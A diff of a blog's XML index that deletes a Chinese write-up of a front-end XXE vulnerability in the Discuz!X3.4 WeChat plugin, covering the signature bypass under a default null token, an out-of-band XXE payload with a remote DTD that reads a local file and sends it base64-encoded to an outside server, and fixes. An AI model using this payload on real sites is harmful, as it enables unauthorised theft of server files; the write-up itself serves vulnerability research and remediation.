@@ -69,31 +69,6 @@
     
     
     <entry>
-      <title>Discuz!X3.4前台XXE漏洞</title>
-      <link href="/1944236470.html"/>
-      <url>/1944236470.html</url>
-      
-        <content type="html"><![CDATA[<h2 id="0x01前言"><a href="#0x01前言" class="headerlink" title="0x01前言"></a>0x01前言</h2><p>比较幸运，刚学完XXE漏洞，转身给我爆了一个XXE。不过有php版本限制</p><h2 id="0x02漏洞环境"><a href="#0x02漏洞环境" class="headerlink" title="0x02漏洞环境"></a>0x02漏洞环境</h2><p>Discuz!X3.4最新版<br>php5.4.45</p><h2 id="0x03影响范围"><a href="#0x03影响范围" class="headerlink" title="0x03影响范围"></a>0x03影响范围</h2><p>漏洞点出在dz中的微信接口处，经过测试需要PHP&lt;=5.4.45因为高版本中的<code>simplexml_load_string</code>已经不在默认加载LIBXML_NOENT，合理猜测所有有微信插件的版本都可能存在，因为没找到旧版本就没测试。</p><h2 id="0x04漏洞分析"><a href="#0x04漏洞分析" class="headerlink" title="0x04漏洞分析"></a>0x04漏洞分析</h2><p>漏洞文件：/source/plugin/wechat/wechat.lib.class.php<br><img src="/1944236470/1.png" alt><br>可以发现<code>simplexml_load_string</code>中的<code>$postdata</code>我们可以控制（可以看一下<code>simplexml_load_string</code>新版本和旧版本的区别），而到这只经过了两次<code>_checkSignature</code>，跟进看一下<br><img src="/1944236470/2.png" alt><br>大致就是进行一个token的检验，其中参数可控，而如果我们知道token的值就能进行伪造，看一下token是如何传进来的，发现是在实体化WeChatServer类的时候进行的初始化<br><img src="/1944236470/3.png" alt><br>直接全局搜索<code>WeChatServer</code><br>在文件/source/plugin/mobile/api/4/wechat.php中进行了实体化<br><img src="/1944236470/4.png" alt><br><code>$_G[&#39;wechat&#39;][&#39;setting&#39;][&#39;wechat_token&#39;]</code>就是我们的token，是由<code>$_G[&#39;setting&#39;][&#39;mobilewechat&#39;]</code>反序列化来的，我们调试一下看看mobilewechat的值，先找一下入口文件，位置在<code>/source/plugin/mobile/mobilie.php</code><br><img src="/1944236470/5.png" alt><br>构造url:<code>http://127.0.0.1/source/plugin/mobile/mobile.php?module=wechat</code><br><img src="/1944236470/6.png" alt><br>可以发现默认的mobilewechat是null，而这样的话token也是null，<br><img src="/1944236470/7.png" alt><br>直接跟进到<code>_checkSignature</code>函数，看<code>$tmpStr</code>的值<br><img src="/1944236470/8.png" alt><br>可以看到<code>$tmpStr</code>的值就是一个3个空值数组的sha1值，此时<code>$tmpStr</code>可知，可直接通过<code>$signatur</code>传值绕过。至此，我们就可以通过<code>$postdata</code>穿payload进行XXE。我们在回头看一下wexin_token的值是怎么产生的<br>文件位置<code>source\plugin\wechat\install\checkupdate.inc.php</code><br><img src="/1944236470/9.png" alt><br>回溯发现，wechat_token是随机产生的一个16位字符，不可控。<br><img src="/1944236470/10.png" alt><br>这里也可以知道为什么token为null了，只有在安装了微信插件的时候才会生成token，而默认配置则是空，这就能直接前台xxe了<br><img src="/1944236470/11.jpg" alt><br>再继续看，既然token不可控，在看是否能获取。发现，在后台微信设置处能进行设置，但这就要后台权限了。懒得上图了……<br>总结：攻击思路两条，1.默认配置–》token=null–》xxe      2.开启微信插件–》后台–》获取token–&gt;xxe</p><h2 id="0x05漏洞复现"><a href="#0x05漏洞复现" class="headerlink" title="0x05漏洞复现"></a>0x05漏洞复现</h2><p>不多bb，无回显的xxe，需要oob。<br>url=<code>http://www.123.com/source/plugin/mobile/mobile.php?module=wechat&amp;signature=da39a3ee5e6b4b0d3255bfef95601890afd80709</code></p><p>然后post：</p><pre><code>&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;%remote;%int;%send;]&gt;</code></pre><p>test.dtd：</p><pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/test.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http://ip:10888?p=%file;&#39;&gt;&quot;&gt;</code></pre><p>可以看到vps上成功拿到了test.txt的base64后的数据<br><img src="/1944236470/11.png" alt></p><h2 id="0x06漏洞修复"><a href="#0x06漏洞修复" class="headerlink" title="0x06漏洞修复"></a>0x06漏洞修复</h2><ol><li>禁用外部实体<br><code>libxml_disable_entity_loader(true);</code></li><li>黑名单过滤<br>对一下字符进行过滤<br><code>&lt;!DOCTYPE、&lt;!ENTITY、SYSTEM、PUBLIC</code></li></ol><hr><p>版权声明：</p><p>除非注明，本博文章均为原创，转载请以链接形式标明本文地址。</p><hr>]]></content>
-      
-      
-      <categories>
-          
-          <category> 代码审计 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Discuz </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>XXE漏洞学习笔记</title>
       <link href="/3842592324.html"/>
       <url>/3842592324.html</url>
